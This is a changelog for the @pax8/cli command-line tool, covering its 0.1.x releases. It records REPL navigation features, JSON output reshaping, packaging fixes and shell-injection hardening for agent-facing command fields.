# @pax8/cli

## 0.1.2

### Patch Changes

- Updated dependencies [[`04aebb8`](https://github.com/pax8labs/pax8-cli/commit/04aebb8f0df7d933d60d92628b1e1e43107049ef)]:
  - @pax8/core@0.1.2

<!--
  Pre-release window: entries below accumulated under 0.1.0 until the first
  public release (publish gate: #370 — opened 2026-06-04). The phantom
  0.2.0 / 0.3.0 / 0.4.0 version headings written by `changeset version` PRs
  during the pre-release window were collapsed; substance preserved.
-->

## 0.1.1 — 2026-06-05

Bootstrap-cycle fixes; no functional changes. `0.1.1` is the de-facto initial public release of `@pax8/cli` on npm — see the note at the end of this entry for why `0.1.0` doesn't exist on the registry.

### Fixed

- **`dependencies['@pax8/core']` correctly references the concrete version.** The first publish attempt for `@pax8/cli@0.1.0` used `npm publish` instead of `pnpm publish` and shipped `"@pax8/core": "workspace:*"` literally — a pnpm workspace protocol that no consumer can resolve. `pnpm publish` rewrites `workspace:*` to the concrete version at pack time; that's what `0.1.1` ships.
- **`README.md` included in the published tarball.** The first publish attempt lacked a package-level README. `packages/cli/README.md` now exists and is automatically included alongside `LICENSE` and `dist/`.

### Note about `@pax8/cli@0.1.0`

`@pax8/cli@0.1.0` was published and unpublished within minutes on 2026-06-04 due to the two issues above. Per npm policy, the `0.1.0` version slot is permanently retired and cannot be republished. `0.1.1` is the de-facto initial public release. `@pax8/core@0.1.0` is unaffected and remains the canonical version of the SDK package — `@pax8/cli@0.1.1` depends on `@pax8/core@0.1.0`.

## 0.1.0 — 2026-06-04

> **Note:** `@pax8/cli@0.1.0` was published and unpublished within minutes on 2026-06-04 due to packaging issues (see `0.1.1` above). The version slot is permanently retired on npm. The entries below describe the substance of the initial public release; the actual artifact shipped is `0.1.1`.

### Minor Changes

- [#556](https://github.com/pax8labs/pax8-cli/pull/556) [`2c03e84`](https://github.com/pax8labs/pax8-cli/commit/2c03e84d1fa4ef38868f5675eb634c0f41b3647e) Thanks [@jidulberger](https://github.com/jidulberger)! - Roll out pickable drill-in across `subscriptions list`, `orders list`, `invoices list`, and `quotes list`. Type a row number at the REPL prompt to drill into that row's detail view — same pattern `clients list` and `recommendations list` already shipped. Closes [#418](https://github.com/pax8labs/pax8-cli/issues/418).

  Each command now:
  - Numbers rows in a leading `#` column (continues across pages — page 2 starts at 26).
  - Persists the index → resource ID map to `~/.pax8/last-list.json` so `subscriptions show 3` resolves the same way `clients show 3` already does.
  - Writes `~/.pax8/pending-actions.json` keyed by row number so the REPL's bare-number-input branch dispatches `<resource> show <id>` for the picked row.
  - Renders the `promptNextSteps` inline pick prompt below the table (no-op outside a TTY, so subprocess / agent invocations see nothing on stderr).

  Extracted the wiring into `lib/list-drill-in.ts:wireListDrillIn()` so the four commands become a single call instead of 30 lines of copy-paste each. The helper handles all three caches + the prompt; the caller supplies the rows, resource name, page-offset, and a label resolver function. Existing `clients list` left alone for this PR (its drill-in path is intertwined with the `--coverage` analysis branch and warrants a separate scoped refactor).

  Quotes additionally renames its previous static `Try next:` block to a one-liner `Or: pax8 quotes show <id>` advisory so the pickable prompt becomes the primary affordance.

- [#565](https://github.com/pax8labs/pax8-cli/pull/565) [`be19118`](https://github.com/pax8labs/pax8-cli/commit/be191182f79067710678b67cccbe39a2f3da866d) Thanks [@jidulberger](https://github.com/jidulberger)! - **Breaking for agent consumers of `nextActions[]`** — every entry now carries both a `command` display string and a structured `args` argv array (matches the `orderArgs` / `orderCommand` pair resolved for recommendations in [#462](https://github.com/pax8labs/pax8-cli/issues/462)/[#509](https://github.com/pax8labs/pax8-cli/issues/509)). Agents must spawn `args.slice(1)` directly via their tool's argv form; the `command` field is for human display only and should never be tokenized or piped to a shell. Closes [#562](https://github.com/pax8labs/pax8-cli/issues/562).

  Pre-fix, `pax8 subscriptions list --product <value> --json --with-actions` interpolated `<value>` straight into `nextActions[0].command` — an agent that handed the display string to a shell faced the same shell-injection class that `orderCommand` had before its `orderArgs` cousin shipped. The full surface affected: every list command's `nextActions` page-action plus the drill-in / filter / audit suggestions composed on top.

  Code changes:
  - `buildNextPageAction` in `lib/output.ts` now takes a `readonly string[]` argv instead of a pre-built string, and returns `{ command, args, description }`.
  - New exported helper `displayCommandFromArgs(args)` renders an argv into a readable command line, quoting only when needed; same source of truth as the `command` field returned by `buildNextPageAction`.
  - Eight list commands rebuilt their `nextPageCommand` construction as argv: `clients list`, `subscriptions list`, `orders list`, `invoices list`, `invoices items`, `products list`, `quotes list`, `contacts list`. Each individual `nextActions.push({ ... })` callsite also now emits the `args` field alongside `command`.
  - New contract test at `packages/cli/src/__tests__/next-actions-argv-contract.test.ts` asserts every nextActions entry carries `command` + `args[0] === "pax8"` AND that a malicious `--product` value lands as a single argv slot, not interpolated.

  Documentation updates:
  - `AGENTS.md` and `packages/claude-skill/skill.md`: `--with-actions` row updated to direct agents at `args` over `command`.
  - `CLAUDE.md`: new "nextActions argv contract ([#562](https://github.com/pax8labs/pax8-cli/issues/562))" note alongside the existing list-envelope ([#483](https://github.com/pax8labs/pax8-cli/issues/483)) note.

  No behavior change for human REPL / table users — the display strings rendered in pagination footers are unchanged (derived from the same argv via `displayCommandFromArgs`).

- [#549](https://github.com/pax8labs/pax8-cli/pull/549) [`94bc016`](https://github.com/pax8labs/pax8-cli/commit/94bc0169b97d12590fd83795bedb66318f493471) Thanks [@jidulberger](https://github.com/jidulberger)! - REPL list navigation: `back`, `n`, `p` now resume the last list session without retyping flags. Closes [#456](https://github.com/pax8labs/pax8-cli/issues/456).

  Pre-fix, the REPL flow `clients list` → type `26` → drill into the company → end up back at `pax8>` left the user with no way to continue browsing except retyping `clients list --page 3`. Surfaced as a daily-workflow paper-cut during partner walkthrough. Three new REPL shortcuts:
  - `back` — re-runs the last list command at the same page (handy after a drill-in: the prior listing is one keystroke away).
  - `n` — pages forward (next page of the last list).
  - `p` — pages backward.

  `clients list` is the first surface wired up. After each render in REPL mode (`PAX8_REPL=1`) the command writes `last-list-context.json` containing the argv it ran with and the resolved `{ number, totalPages }` envelope, and the REPL reads that file when `n`/`p`/`back` is typed. Argv rewriting handles both the "user typed `--page N`" case (replace) and the implicit-default case (append). Each list footer in REPL mode prints a one-line `REPL: n=next · p=prev · back=re-run` hint so the affordance is discoverable.

  Boundary checks: `n` at the last page and `p` at the first page print a dim "Already on the last/first page" message and re-prompt instead of clobbering state. Missing or corrupt `last-list-context.json` triggers a clean "No recent list to navigate" message — never a spawn with garbage argv.

  Shape validation on the loaded context (`loadLastListContext`) defensively rejects tampered files — a tampered or truncated context can't surface an unexpected argv. Wired through `safeWriteFileSync` so the cache file is mode `0o600` and refuses to follow symlinks (same posture as the pre-existing `last-list.json` + `pending-actions.json` writes).

  This wires `clients list` only as the proof-of-pattern; the same `saveLastListContext()` call belongs on `subscriptions list`, `invoices list`, `orders list`, `quotes list`, `contacts list`, `webhooks list`, etc. — tracked separately so each rollout can be reviewed cleanly.

  Helpers exposed in `lib/last-list.ts` for the rollout: `saveLastListContext`, `loadLastListContext`, `rewriteArgvForPage`, plus the `LastListContext` interface. 7 new unit tests cover round-trip, corruption, shape validation, and argv rewriting (replace + append + no-mutate).

### Patch Changes

- [#580](https://github.com/pax8labs/pax8-cli/pull/580) — `invoices audit --json` now returns the audit report as a plain object instead of a single-element array. Consumers that wrote `Array.isArray(x) ? x[0] : x` to defend against the legacy shape can drop the unwrap. Affects both the populated and empty-state paths; the empty-state object also gains `itemsAudited: 0` to match the populated key set. Surfaced during the pre-release e2e walkthrough of the golden-path command table.

- [#577](https://github.com/pax8labs/pax8-cli/pull/577) — `auth status --json` renames `authenticated` → `credentialsPresent`. The previous name implied a network-validated session, but the command only checks credential files on disk; the new name makes the offline scope explicit. Use `pax8 auth check` (or `pax8 doctor`) for the network-validated check that actually exchanges credentials with `/v1/token`. Closes [#573](https://github.com/pax8labs/pax8-cli/issues/573).

- [#568](https://github.com/pax8labs/pax8-cli/pull/568) [`242fbed`](https://github.com/pax8labs/pax8-cli/commit/242fbed0058786aff69364d770b76d418b9c742c) Thanks [@jidulberger](https://github.com/jidulberger)! - Pre-launch documentation cleanup, no code changes:
  - **`README.md`** — restructured Quick Start into explicit "Install / Run / Authenticate" steps with three documented invocation paths (`node dist/index.js`, `npm link`'d `pax8`, `pnpm dev`); de-duplicated the pre-release banner (was repeated three times); expanded the Commands section to surface `contacts`, `quotes`, `webhooks`, `usage`, `config`, `report`, `init`, `completions`, `version`, `report-bug`, `telemetry` (the existing surface but only the prominent commands were documented); fixed the `report mrr` / `report growth` paragraph that still said "v0.2 reporting work will rebuild" when `pax8 report renewals|concentration|subscriptions` already shipped; rebuilt the REPL Mode section to show the welcome banner and document `back` / `n` / `p` shortcuts; replaced the Documentation section's BUILD.md link with current contributor / partner-facing pointers.
  - **`SUPPORT.md`** — added `pax8 version` and `PAX8_DEMO=1` reproduction tips to "Try first".
  - **`CHANGELOG.md`** — converted the root file from a duplicate-of-truth into a pointer to the changesets-managed per-package CHANGELOGs (`packages/cli/CHANGELOG.md`, `packages/core/CHANGELOG.md`). The v0.1.0 release entry stays for archaeology; the unmaintained "Unreleased" section that was lagging behind 0.2.x / 0.3.0 is gone.
  - **`docs/BUILD.md` → `docs/history/BUILD.md`** — moved the autonomous-build prompt out of the user-facing docs path. Added a "Historical document" banner explaining what it is. Updated the two references in `CLAUDE.md`.
  - **`docs/release/CHECKLIST.md`** — new working doc for the public OSS launch, structured by phase (decisions, code/test gates, infra, release mechanics, comms, post-launch ops). The release plan lives in chat-transcript context; this file is the executable form.

- [#553](https://github.com/pax8labs/pax8-cli/pull/553) [`f95ea91`](https://github.com/pax8labs/pax8-cli/commit/f95ea91489606fc2e9725086434292cac010a18a) Thanks [@jidulberger](https://github.com/jidulberger)! - Extend the REPL `back` / `n` / `p` list navigation from [#456](https://github.com/pax8labs/pax8-cli/issues/456) across the rest of the list command surface. `subscriptions list`, `orders list`, `invoices list`, and `quotes list` now all save the `last-list-context.json` snapshot after each render and surface the `REPL: n=next · p=prev · back=re-run` footer hint when running under `PAX8_REPL=1`. Closes the rollout slice of [#456](https://github.com/pax8labs/pax8-cli/issues/456) that [#549](https://github.com/pax8labs/pax8-cli/issues/549) explicitly deferred.

  Implementation extracts the `if (process.env.PAX8_REPL === "1") { ... }` block from `companies/list.ts` into a shared `renderReplNavHint(pageEnvelope)` helper in `lib/output.ts` so each command is a one-line addition rather than a copy-paste of the hint rendering. The context-save block stays inline (a few lines per command, with the same `back`/`n`/`p` re-entry guard the original [#549](https://github.com/pax8labs/pax8-cli/issues/549) code used).

  No behavior change outside the REPL — `PAX8_REPL` env var gates both the hint and the context save's affordance. Full suite green: 2135 passing.

- [#547](https://github.com/pax8labs/pax8-cli/pull/547) [`047751f`](https://github.com/pax8labs/pax8-cli/commit/047751ff0c61d3b7e9cd3d05932cc9bb7edda7bc) Thanks [@jidulberger](https://github.com/jidulberger)! - `promptNextSteps()` now reuses the active CLI entrypoint when drilling into a numbered option, matching the REPL's behavior. Closes [#457](https://github.com/pax8labs/pax8-cli/issues/457).

  Pre-fix, the inline numeric-pick prompt rendered by `clients list`, `subscriptions renewals`, `contacts list`, `usage list`, and several others called `spawn("pax8", ...)` — which silently no-ops or fails when the CLI is launched via `node packages/cli/dist/index.js`, a yarn `-g` install in a non-standard prefix, or a linked local binary that isn't on `$PATH`. The REPL itself had the right pattern via `resolveCliPath(process.argv[1])` (see `lib/repl.ts`); this aligns the drill-in path with that.

  Implementation: `lib/next-step.ts` now imports `resolveCliPath` from `lib/repl.ts` and spawns `node <cliPath> <args>` instead of `pax8 <args>`. A best-effort fallback to the legacy `spawn("pax8", ...)` shape is kept for the edge case where `process.argv[1]` is empty (e.g. a future embedded caller in an MCP wrapper).

- [#548](https://github.com/pax8labs/pax8-cli/pull/548) [`04435c2`](https://github.com/pax8labs/pax8-cli/commit/04435c24697de6371495a86c4b29358da76e0bd8) Thanks [@jidulberger](https://github.com/jidulberger)! - `docs/PRD.md`: update the post-[#443](https://github.com/pax8labs/pax8-cli/issues/443) reshape so the document matches the
  current `pax8 report subscriptions` / `pax8 report concentration` /
  `pax8 report renewals` surface instead of the retired `pax8 report mrr` /
  `pax8 report growth` framing. Closes [#460](https://github.com/pax8labs/pax8-cli/issues/460).

  `AGENTS.md` and `README.md` were already clean of stale `report mrr` /
  `PAX8_API_TIMEOUT` references; the lingering README mention is
  explicitly historical and conforms to [#460](https://github.com/pax8labs/pax8-cli/issues/460)'s AC [#3](https://github.com/pax8labs/pax8-cli/issues/3). No code change.

- [#564](https://github.com/pax8labs/pax8-cli/pull/564) [`696215c`](https://github.com/pax8labs/pax8-cli/commit/696215cdf61ea6bf9da42bfc7b98785823907169) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix REPL bare-number drill-in regression: typing a row number after a list command silently did nothing. The REPL dispatch regex at `lib/repl.ts:191` requires `command` strings in `pending-actions.json` to start with `pax8 ` (defense-in-depth from [#506](https://github.com/pax8labs/pax8-cli/issues/506), so a tampered cache file can't dispatch arbitrary subcommands), but `clients list` and the `list-drill-in.ts` helper (rolled out across `subscriptions / orders / invoices / quotes list` per [#418](https://github.com/pax8labs/pax8-cli/issues/418)/[#556](https://github.com/pax8labs/pax8-cli/issues/556)) wrote the unprefixed form `clients more 3` / `<resource> show <id>`. The regex never matched and the bare-number input fell through to `node cliPath 3`, which the CLI rejected as `unknown command '3'`. Prefix both writers with `pax8 ` to honor the contract. Closes [#561](https://github.com/pax8labs/pax8-cli/issues/561).

  Adds a contract test in `repl.integration.test.ts` that reads `pending-actions.json` after `clients list` and asserts every entry's `command` matches the same `/^pax8\s+\w/` regex the production dispatch checks — so a future writer that drops the prefix is caught at the same condition.

- [#566](https://github.com/pax8labs/pax8-cli/pull/566) [`ec7e5dd`](https://github.com/pax8labs/pax8-cli/commit/ec7e5dd3d9cdf412968f9f47ba47b9bbd8b00e32) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix the dev-mode REPL: typing any command after launching via `pnpm dev` no longer crashes the child with `ERR_MODULE_NOT_FOUND`. The REPL's spawn at `lib/repl.ts:235` hardcoded `node` even when the parent was running under `tsx`, so `cliPath` (a `.ts` source file in dev mode) was handed to a vanilla `node` that couldn't resolve TypeScript. Detect a `.ts` entrypoint and register the tsx ESM loader via Node's `--import` hook so the child resolves the same way the parent does. Also switch the spawn target from the string `"node"` to `process.execPath` so nvm / asdf / custom-node setups don't need `node` on PATH. Closes [#563](https://github.com/pax8labs/pax8-cli/issues/563).

  The masking effect: contributors who followed `CONTRIBUTING.md`'s documented dev workflow (`PAX8_DEMO=1 pnpm dev`) couldn't test REPL behavior locally — every typed command crashed before the dispatch handler ran. Combined with the test suite only exercising `dist/index.js`, this let dispatch-layer bugs like [#561](https://github.com/pax8labs/pax8-cli/issues/561) (REPL bare-number drill-in dead) ship invisibly past CI. The dev-mode regression test added here (`runReplViaTsx` harness in `repl.integration.test.ts`) is the second layer of the contract — both invocation paths must dispatch a typed command without a module-resolution error.

- [#569](https://github.com/pax8labs/pax8-cli/pull/569) [`2f3b657`](https://github.com/pax8labs/pax8-cli/commit/2f3b6571842cc3080351bbfd3d24d62d131b6848) Thanks [@jidulberger](https://github.com/jidulberger)! - Pre-launch scrub: remove internal Pax8 system references that [#461](https://github.com/pax8labs/pax8-cli/issues/461)/[#489](https://github.com/pax8labs/pax8-cli/issues/489) missed. No behavior change; only comments, help text, and one private URL.
  - **Internal Jira-style ticket prefixes** (`ARC-`, `PAE-`, `PAM-`) — present in user-facing `--help` text on `pax8 recommendations list / act` and `pax8 clients create`, plus a dozen code comments across `packages/cli` and `packages/core`. Partners running `--help` saw "ARC-785" / "PAM-997" with no context; rewrote the text to be self-contained (e.g. "Pax8's first-party Opportunity Explorer API ships" instead of "ARC-785, `GET /opportunities`"). The companion test assertion in `companies.test.ts` that checked for `"PAM-997"` in `--help` output now checks for `"Pax8 API Reference"` to match the new wording.
  - **Reviewer names** (`Cassie`) — leaked through into source comments and one changeset; replaced with generic "domain review" / "partner walkthrough" framing.
  - **Private Atlassian URLs** — `packages/core/src/api/types.test.ts` had two `pax8.atlassian.net` links in its preamble (Marketplace Data Risk Tiering doc, CLI Domain Review approval doc). Public viewers would 403; replaced with paraphrased descriptions.
  - **Stale doc reference** — `docs/pm-review-response-2026-05.md` cited in `types.test.ts` doesn't exist in the repo. Removed.

  Historical per-package CHANGELOGs (`packages/cli/CHANGELOG.md`, `packages/core/CHANGELOG.md`) deliberately left alone — they're append-only release-note records.

- [#554](https://github.com/pax8labs/pax8-cli/pull/554) [`3a5cca4`](https://github.com/pax8labs/pax8-cli/commit/3a5cca401fabece3f9ef8f49106ac3af8a3d2af4) Thanks [@jidulberger](https://github.com/jidulberger)! - Add subprocess smoke coverage for `pax8 init`, `pax8 completions`, and the `coffee` / `moo` easter eggs — the four CLI surfaces previously listed in the partner-readiness audit as having zero test references. Closes [#395](https://github.com/pax8labs/pax8-cli/issues/395).

  `packages/cli/src/__tests__/smoke-misc.test.ts` (new file, 9 tests):
  - `init` — `--help` output, default-config creation in a tmp `PAX8_CONFIG_DIR`, `--demo` / `--demo off` toggle round-trip via the on-disk config file.
  - `completions` — bash + zsh script generation, plus the `--help` smoke.
  - `coffee` — asserts the final "Your coffee is ready" line lands on stdout (the 6-second progress-bar simulation runs end-to-end; per-test timeout bumped to 15s rather than globally so the rest of the smoke suite stays fast).
  - `moo` — asserts the ASCII cow's `(oo)` fingerprint + the quoted fortune-line pattern.

  `time-quip` is an internal helper (no command surface) and isn't covered here — it's already exercised indirectly by the welcome-screen tests. `report-bug` was on the original issue list but already had thorough coverage in `report-bug.test.ts`; no additions needed.

  Full suite: 2144 passing (+9 from this PR).

- [#545](https://github.com/pax8labs/pax8-cli/pull/545) [`3716e8a`](https://github.com/pax8labs/pax8-cli/commit/3716e8acf28687e516eada27eac9dc1ceee6fb4b) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 usage list --help` now explicitly documents the pagination contract — that each per-subscription `/v1/subscriptions/{id}/usage-summaries` fetch accepts `page` / `size`, the default is 50, the max is `LIST_SIZE_CAP` (1000) with stderr-clamp warning per [#518](https://github.com/pax8labs/pax8-cli/issues/518), and the fan-out behavior when `--company` or no filter is used (each subscription paged independently, results concatenated). Closes [#397](https://github.com/pax8labs/pax8-cli/issues/397).

  No behavior change — the flags were always exposed and the cap already enforced. This makes the contract explicit in the Notes block so partners with high-usage subscriptions don't get surprised by truncation. [#483](https://github.com/pax8labs/pax8-cli/issues/483) also added the `{ usage, page }` JSON envelope on this command earlier today.

- Updated dependencies [[`c56eb06`](https://github.com/pax8labs/pax8-cli/commit/c56eb060d996c3ac248487ad3ab3ad22d5127315), [`9842846`](https://github.com/pax8labs/pax8-cli/commit/98428464403624b833a2af8b63d62ed1137e97e2), [`2f3b657`](https://github.com/pax8labs/pax8-cli/commit/2f3b6571842cc3080351bbfd3d24d62d131b6848)]:
  - @pax8/core@0.4.0

### Minor Changes

- [#543](https://github.com/pax8labs/pax8-cli/pull/543) [`e7ef4a7`](https://github.com/pax8labs/pax8-cli/commit/e7ef4a72a15ec7e491e4c948ae571a0340ffc8df) Thanks [@jidulberger](https://github.com/jidulberger)! - **Breaking** (`--json` shape across every list command, pre-publish): every `--json` list command now emits a wrapped envelope `{ <resource>: [...], page: { number, size, totalElements, totalPages } }` instead of a flat array. Per [#370](https://github.com/pax8labs/pax8-cli/issues/370) the package isn't published yet, so no deprecation cycle is owed; consumers switch `JSON.parse(out)` → `JSON.parse(out).<resource>`. Closes [#483](https://github.com/pax8labs/pax8-cli/issues/483).

  Ports the pattern proven in [#478](https://github.com/pax8labs/pax8-cli/issues/478) (orders list) across the remaining list surface — `subscriptions list`, `clients list`, `invoices list`, `invoices items`, `quotes list`, `contacts list`, `products list`, `products search`, `usage list`, `webhooks list`, `webhooks logs`, `webhooks topics list`, `subscriptions renewals`. `recommendations list` was already wrapped as `{ recommendations, totalAvailable }` per [#521](https://github.com/pax8labs/pax8-cli/issues/521) and is left untouched. Endpoints without server-side pagination (webhooks, usage, products search, renewals) get a `singlePageEnvelope(rowCount)` synthesized so the shape stays consistent.

  `page.number` is 1-based — matches what the user would pass as `--page` next. Compare `<resource>.length` to `page.totalElements` to detect pagination. With `--with-actions`, a `nextActions` array is added (including a next-page entry when more pages exist). Table footers consolidated onto a single format: `Page N of M — K records — next: pax8 <cmd> --page N+1 …` (suppressed on the last page; suppressed entirely on empty result sets so the empty-state message stands alone).

  **Uncapped name enrichment.** `companies.list({ size: 200 })` callsites in `subscriptions list`, `subscriptions renewals`, and `recommendations list` replaced with `buildCompanyNameMap` / `fetchAllCompanies` from `lib/enrich-subscriptions.ts`. Pre-fix, partners with >200 customers saw blank Company cells in those views; post-fix the helper pages through `companies.list` until every referenced ID is resolved or a 10×1000 guardrail trips. Remaining 200-cap sites (dashboard, recommendations/act, recommendations/upsell, report/\*) are tracked for follow-up — each carries its own product semantics worth a focused PR.

  Helpers exposed for future list commands: `buildPageEnvelope(wirePage)`, `renderPaginationFooter(env, opts)`, `buildNextPageAction(env, cmd, resource)`, `singlePageEnvelope(rowCount)`, `buildCompanyNameMap(ctx, rows, opts)`, `fetchAllCompanies(ctx)`. `CLAUDE.md` and `docs/UX_GUIDE.md` §6 updated to document the envelope contract as a stable agent-facing surface.

- [#544](https://github.com/pax8labs/pax8-cli/pull/544) [`74cd0e4`](https://github.com/pax8labs/pax8-cli/commit/74cd0e44120aebe49baa0f154cffb6d039840b38) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 subscriptions list` now exposes the server-side `billingTerm`, `productId`, and `sort` filters the public OpenAPI has always supported. Closes [#398](https://github.com/pax8labs/pax8-cli/issues/398).

  Three new flags, additive — every existing invocation still works unchanged:
  - `--billing-term <Monthly|Annual|2-Year|3-Year|One-Time|Trial|Activation>` — fails fast on typos before any network call, same vocabulary as `--status` ([#408](https://github.com/pax8labs/pax8-cli/issues/408)).
  - `--product <productId>` — passes through to the wire as `?productId=…`. UUID expected; no fuzzy product-name resolution here because the typical use case is `subscriptions list --product <copy-pasted-id-from-a-prior-row>`.
  - `--sort <field>` / `--sort <field>:<direction>` — accepts `quantity`, `startDate`, `endDate`, `createdAt`. Ascending by default; append `:desc` for descending. The user-facing separator is `:` (not `,`) to avoid shell-quoting surprises; the CLI rewrites it to the wire's `field,direction` form before forwarding.

  Pre-fix, partners with large portfolios had to download a full subscriptions list and filter client-side — even though the OpenAPI spec defined these parameters. `MockPax8Client.SubscriptionsResource.list` mirrors the server-side filtering for every new parameter so `PAX8_DEMO=1` exercises the same code path as the real API.

  `@pax8/core`'s `SubscriptionsApi.list` signature gains the three new optional fields. Type-safe additive change; consumers that don't pass the new fields are unaffected.

### Patch Changes

- [#541](https://github.com/pax8labs/pax8-cli/pull/541) [`94b80a8`](https://github.com/pax8labs/pax8-cli/commit/94b80a8612f9b9cc02a22dfed275673ba1a132a5) Thanks [@jidulberger](https://github.com/jidulberger)! - Third batch of [#386](https://github.com/pax8labs/pax8-cli/issues/386) wire-level write coverage. Extends `e2e/integration/orders.integration.test.ts` with an `orders create --dry-run` test.

  `--dry-run` maps to `isMock=true` on the wire — the server validates the order payload as if committing, then returns without creating a real order. Same wire-regression guard as the round-trip tests for webhooks ([#539](https://github.com/pax8labs/pax8-cli/issues/539)) and quotes ([#540](https://github.com/pax8labs/pax8-cli/issues/540)), but achieved without an inverse step because Pax8 supports `isMock` natively on the orders surface. No artifact in the sandbox, no cleanup, no sweep workflow needed.

  The test asserts both the wire URL (`POST /v1/orders`) and that the request carried `?isMock=true` — so a future refactor that accidentally drops the dry-run threading would quietly start creating real orders against the sandbox, and this catch-it-at-the-belt-and-suspenders assertion ensures we notice immediately.

  Three of four resources from [#386](https://github.com/pax8labs/pax8-cli/issues/386)'s bullet list now covered (webhooks, quotes, orders). `subscriptions cancel` is the remaining holdout — it has no `isMock` equivalent and no inverse, so the next PR's approach is to gate it behind an explicit `PAX8_INTEGRATION_DESTRUCTIVE=1` env var (default off in PR CI; opt-in for nightly runs).

- [#540](https://github.com/pax8labs/pax8-cli/pull/540) [`da77ba4`](https://github.com/pax8labs/pax8-cli/commit/da77ba4fe080a242bb49bde291644a5c7e058ab5) Thanks [@jidulberger](https://github.com/jidulberger)! - Second batch of [#386](https://github.com/pax8labs/pax8-cli/issues/386) wire-level write coverage. Extends `e2e/integration/quotes.integration.test.ts` with a `quotes create` → `quotes delete` round-trip that follows the pattern proven in [#539](https://github.com/pax8labs/pax8-cli/issues/539)'s webhooks test.

  Resource picked for the same reasons as webhooks: full CRUD exists in the CLI, draft-state creates are non-binding (no `quotes send`, so the customer never sees anything), and `--product` is optional so the test can fire the smallest possible write that exercises `POST /v2/quotes`. The test fetches the first row from `companies list --json` rather than hard-coding a company ID, so it runs against any sandbox tenant that has at least one company on file.

  Still does not close [#386](https://github.com/pax8labs/pax8-cli/issues/386) — that asks for write coverage on at least four resources (orders create, quotes create + send, subscriptions cancel, webhooks create + enable/disable) plus a documented cleanup strategy. Webhooks ([#539](https://github.com/pax8labs/pax8-cli/issues/539)) and quotes (this PR) are the two resources with full CRUD; the remaining two (orders, subscriptions) lack an inverse operation and need a separate cleanup story before they can land.

- [#539](https://github.com/pax8labs/pax8-cli/pull/539) [`a8a4de5`](https://github.com/pax8labs/pax8-cli/commit/a8a4de54ab631088a5bf97f433a8236afb2213bc) Thanks [@jidulberger](https://github.com/jidulberger)! - First batch of [#386](https://github.com/pax8labs/pax8-cli/issues/386) wire-level write coverage. Adds `e2e/integration/webhooks.integration.test.ts` with two tests:
  1. A read smoke (`webhooks list --json`) pinning the resolved URL to the documented `/api/v2/webhooks` path — same regression-class guard as the companies / quotes / orders smokes.
  2. A write round-trip (`webhooks create` → `webhooks delete`) that creates a webhook against a non-routable RFC-6761 `https://example.invalid/...` callback URL, captures the new ID from the create envelope, then immediately fires a delete. No artifacts left in the sandbox tenant on success; on partial failure the worst case is a single dangling row pointing at a non-routable URL that a manual sweep can pick up.

  Webhooks was chosen as the safest first write target because: full CRUD exists in the CLI, no billing/order/customer side effects, and the callback URL fixture means nothing on the partner side ever actually fires.

  Doesn't fully close [#386](https://github.com/pax8labs/pax8-cli/issues/386) — that issue asks for write coverage across at least four resources plus a documented cleanup strategy. Subsequent PRs will follow this pattern for quotes (create + delete), and document cleanup expectations for resources without an inverse operation (orders, subscriptions cancel) in CONTRIBUTING.md.

  `integration.yml` still runs with `continue-on-error: true`. Promotion to a required gate is a separate decision once the suite has more breadth.

- [#543](https://github.com/pax8labs/pax8-cli/pull/543) [`e7ef4a7`](https://github.com/pax8labs/pax8-cli/commit/e7ef4a72a15ec7e491e4c948ae571a0340ffc8df) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 products show <id> --provisioning` now hits the correct Pax8 endpoint and parses the response shape per the spec. Closes [#443](https://github.com/pax8labs/pax8-cli/issues/443) (Candidate H from `docs/triage/v0.1.0-candidates.md`), surfaced by Fred Lintz's correction during domain review.

  Three bugs fixed in lockstep — the half-implementation worked under `PAX8_DEMO=1` (the mock matched the hallucination) but would 404 against the real API and then throw a Zod parse error after the path:
  1. **Endpoint path.** `/products/{id}/provisioning-details` → `/products/{id}/provision-details` (the Pax8 spec uses the singular form per `findProvisionDetailsByProductId`).
  2. **Response shape.** The endpoint returns `{ content: ProvisioningDetail[] }` (envelope-wrapped array). `getProvisioningDetails` now returns `ProvisioningDetail[]`; `products show --provisioning --json` emits a top-level `provisioningDetails` array, not the previous single object.
  3. **Schema.** Replaced the hallucinated `{ productId, vendorPrerequisites, fields[{ name, label, type, required, options }] }` with the spec shape: `{ key?, label?, description?, valueType?: "Input" | "Single-Value" | "Multi-Value", possibleValues?, values? }`. The schema is now shared with the `orders create` and `subscriptions update` write paths — same component on the wire, same shape in `@pax8/core`.

  Mock fixtures (`packages/core/src/mock/mock-client.ts`) updated to the spec shape too, so `PAX8_DEMO=1` and the real API now exercise the same code path. **Breaking** to `provisioningDetails` JSON shape (was a single object with `productId/vendorPrerequisites/fields`; now a `ProvisioningDetail[]` array) — pre-publish, no deprecation owed.

  Threading provision details into orders / subscriptions write paths per Fred's "safest bet is to always add provision details to each line item" guidance is tracked separately as Candidate H Option B.

- [#537](https://github.com/pax8labs/pax8-cli/pull/537) [`8994a14`](https://github.com/pax8labs/pax8-cli/commit/8994a14d207efa704c77d42f475b2e4ec05febce) Thanks [@jidulberger](https://github.com/jidulberger)! - Close [#462](https://github.com/pax8labs/pax8-cli/issues/462) follow-up: agent-facing docs now steer programmatic callers to `orderArgs` (the safe argv-style field shipped in [#498](https://github.com/pax8labs/pax8-cli/issues/498)) instead of inviting them to shell-paste `orderCommand`.

  Five surfaces updated in lockstep:
  - `CLAUDE.md` "act on a recommendation" row
  - `AGENTS.md` matching table row and the longer "Recommendation → order" callout
  - `packages/claude-skill/skill.md` "Recommendation → order" callout
  - `packages/claude-skill/src/tools/recommendations.ts` MCP tool description

  Each now says: prefer `orderArgs.slice(1)` (an argv array with `"pax8"` as element 0) for subprocess / Bash execution. `orderCommand` is documented as a human-readable display string that interpolates the raw partner-controlled `companyName` — safe to render in a preview, unsafe to shell-eval.

  No code changes; the code paths in `dashboard.ts`, `recommendations/list.ts`, `recommendations/act.ts`, and `repl.ts` already prefer `orderArgs` per the [#509](https://github.com/pax8labs/pax8-cli/issues/509) work, and `getRecommendations` has emitted both fields since [#498](https://github.com/pax8labs/pax8-cli/issues/498). This PR just brings the agent-facing prose in line with the existing safe-path implementation.

- Updated dependencies [[`e7ef4a7`](https://github.com/pax8labs/pax8-cli/commit/e7ef4a72a15ec7e491e4c948ae571a0340ffc8df), [`74cd0e4`](https://github.com/pax8labs/pax8-cli/commit/74cd0e44120aebe49baa0f154cffb6d039840b38)]:
  - @pax8/core@0.3.0

### Minor Changes

